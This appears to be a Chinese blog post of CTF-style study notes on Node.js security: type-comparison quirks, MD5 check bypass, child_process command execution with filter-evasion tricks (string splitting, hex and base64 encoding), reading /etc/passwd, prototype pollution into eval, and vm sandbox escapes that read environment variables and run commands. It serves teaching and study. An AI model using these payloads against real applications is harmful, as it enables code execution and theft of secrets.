        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/3418e521.html" class="post-title-link" itemprop="url">nodejs</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-28 21:19:19" itemprop="dateCreated datePublished" datetime="2022-09-28T21:19:19+08:00">2022-09-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:29:04" itemprop="dateModified" datetime="2024-09-28T20:29:04+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="Nodejs-入门"><a href="#Nodejs-入门" class="headerlink" title="Nodejs 入门"></a>Nodejs 入门</h1><p>（借鉴总结）</p>
<h3 id="1-1-nodejs语言的缺点"><a href="#1-1-nodejs语言的缺点" class="headerlink" title="1.1 nodejs语言的缺点"></a>1.1 nodejs语言的缺点</h3><h4 id="1-1-1-大小写特性"><a href="#1-1-1-大小写特性" class="headerlink" title="1.1.1 大小写特性"></a>1.1.1 大小写特性</h4><p>toUpperCase()<br>toLowerCase()</p>
<p>对于toUpperCase(): 字符<code>&quot;ı&quot;</code>、<code>&quot;ſ&quot;</code> 经过toUpperCase处理后结果为 <code>&quot;I&quot;</code>、<code>&quot;S&quot;</code><br>对于toLowerCase(): 字符<code>&quot;K&quot;</code>经过toLowerCase处理后结果为<code>&quot;k&quot;</code>(这个K不是K)</p>
<h4 id="1-1-1-弱类型比较"><a href="#1-1-1-弱类型比较" class="headerlink" title="1.1.1 弱类型比较"></a>1.1.1 弱类型比较</h4><p><strong>大小比较</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false</p>
<p><em>数组的比较：</em></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]&gt;[]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>]&gt;[<span class="number">5</span>]); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>);  <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&quot;10&quot;</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>总结：<code>空数组之间比较永远为false`，</code>数组之间比较只比较数组间的第一个值<code>，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，</code>数组永远小于非数值型字符串&#96;&#96;；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p>
<p><em>还有一些比较特别的相等：</em></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>) <span class="comment">// 输出：true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>) <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>)  <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>)  <span class="comment">// 输出：false</span></span><br></pre></td></tr></table></figure>

<p><strong>变量拼接</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,3 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure>

<h4 id="1-1-3-MD5的绕过"><a href="#1-1-3-MD5的绕过" class="headerlink" title="1.1.3 MD5的绕过"></a>1.1.3 MD5的绕过</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure>

<p>a[x]&#x3D;1&amp;b[x]&#x3D;2</p>
<p>数组会被解析成<code>[object Object]</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="1-1-4-编码绕过"><a href="#1-1-4-编码绕过" class="headerlink" title="1.1.4 编码绕过"></a>1.1.4 编码绕过</h4><p><strong>16进制编码</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>===<span class="string">&quot;\x61&quot;</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>unicode编码</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>base编码</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>

<h2 id="1-2-危险函数"><a href="#1-2-危险函数" class="headerlink" title="1.2 危险函数"></a>1.2 危险函数</h2><h3 id="1-2-1-RCE"><a href="#1-2-1-RCE" class="headerlink" title="1.2.1 RCE"></a>1.2.1 RCE</h3><p>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p>
<p>eval(js代码)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);</span><br><span class="line"><span class="number">2.</span><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);</span><br><span class="line"><span class="number">3.</span><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constuctor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-2-2-文件读写"><a href="#1-2-2-文件读写" class="headerlink" title="1.2.2 文件读写"></a>1.2.2 文件读写</h3><h4 id="一、读取"><a href="#一、读取" class="headerlink" title="一、读取"></a>一、读取</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="title function_">readFile</span>()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,(err,data))=&gt;(</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="number">2.</span><span class="title function_">readFileSync</span>()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="title function_">writeFileSync</span>()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;sss&#x27;</span>);</span><br><span class="line"><span class="number">2.</span><span class="title function_">writeFile</span>()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFile</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-nodejs危险函数-RCE-bypass"><a href="#1-2-3-nodejs危险函数-RCE-bypass" class="headerlink" title="1.2.3 nodejs危险函数-RCE bypass"></a>1.2.3 nodejs危险函数-RCE bypass</h4><p><strong>bypass</strong></p>
<p>原型：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>字符拼接：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="comment">//(%2b就是+的url编码)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>编码绕过：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat fl001g.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()) <span class="comment">//弹计算器</span></span><br></pre></td></tr></table></figure>

<p>模板拼接：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;open /System/Applications/Calculator.app/&#x27;</span>）</span><br></pre></td></tr></table></figure>

<p>其他函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); *<span class="comment">//调用某个可执行文件，在第二个参数传args* </span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="1-3-全局变量-global的属性"><a href="#1-3-全局变量-global的属性" class="headerlink" title="1.3 全局变量(global的属性)"></a>1.3 全局变量(global的属性)</h3><h4 id="1-exports-：-将本模块接口进行导出。另一种表达方式是-module-exports-。"><a href="#1-exports-：-将本模块接口进行导出。另一种表达方式是-module-exports-。" class="headerlink" title="1.exports ： 将本模块接口进行导出。另一种表达方式是 module.exports 。"></a>1.exports ： 将本模块接口进行导出。另一种表达方式是 module.exports 。</h4><h4 id="2-require-：-包含本模块导入其他模块的信息。require-main-等同于-module-。"><a href="#2-require-：-包含本模块导入其他模块的信息。require-main-等同于-module-。" class="headerlink" title="2.require ： 包含本模块导入其他模块的信息。require.main 等同于 module 。"></a>2.require ： 包含本模块导入其他模块的信息。require.main 等同于 module 。</h4><h4 id="3-module-：指向当前模块的引用，包含当前模块的路径、目录等信息。"><a href="#3-module-：指向当前模块的引用，包含当前模块的路径、目录等信息。" class="headerlink" title="3.module ：指向当前模块的引用，包含当前模块的路径、目录等信息。"></a>3.module ：指向当前模块的引用，包含当前模块的路径、目录等信息。</h4><h4 id="4-filename-：表示当前模块文件的路径（包含模块文件名的全路径）"><a href="#4-filename-：表示当前模块文件的路径（包含模块文件名的全路径）" class="headerlink" title="4.__filename ：表示当前模块文件的路径（包含模块文件名的全路径）"></a>4.__filename ：表示当前模块文件的路径（包含模块文件名的全路径）</h4><h4 id="5-dirname-：表示当前模块所在文件夹的路径"><a href="#5-dirname-：表示当前模块所在文件夹的路径" class="headerlink" title="5.__dirname ：表示当前模块所在文件夹的路径"></a>5.__dirname ：表示当前模块所在文件夹的路径</h4><h2 id="2-nodejs原型链污染"><a href="#2-nodejs原型链污染" class="headerlink" title="2 nodejs原型链污染"></a>2 nodejs原型链污染</h2><h3 id="2-1-prototype原型"><a href="#2-1-prototype原型" class="headerlink" title="2.1 prototype原型"></a>2.1 prototype原型</h3><p><strong>简介：</strong></p>
<p>对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015&#x2F;ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p>
<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p>
<p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">name,age</span>)&#123;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I&#x27;m &quot;</span>+<span class="variable language_">this</span>.<span class="property">name</span>+<span class="string">&quot; And I&#x27;m &quot;</span>+<span class="variable language_">this</span>.<span class="property">age</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn=<span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="string">&#x27;xiaoming&#x27;</span>,<span class="number">19</span>);</span><br><span class="line">fn.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="property">toString</span>===<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>.<span class="property">toString</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="property">__proto__</span>===<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>===<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>===<span class="literal">null</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png" alt="img"></p>
<h3 id="2-2-原型链污染原理"><a href="#2-2-原型链污染原理" class="headerlink" title="2.2 原型链污染原理"></a>2.2 原型链污染原理</h3><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar，此时bar为2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-3-原型链污染配合RCE"><a href="#2-3-原型链污染配合RCE" class="headerlink" title="2.3 原型链污染配合RCE"></a>2.3 原型链污染配合RCE</h3><p>有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;open /System/Applications/Calculator.app/\&#x27;);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>))</span><br></pre></td></tr></table></figure>

<p>2.4 </p>
<h2 id="3-vm沙箱逃逸"><a href="#3-vm沙箱逃逸" class="headerlink" title="3 vm沙箱逃逸"></a>3 vm沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸</p>
<p>逃逸例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">env = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>

<p>执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）</p>
<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span></span><br><span class="line"><span class="string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
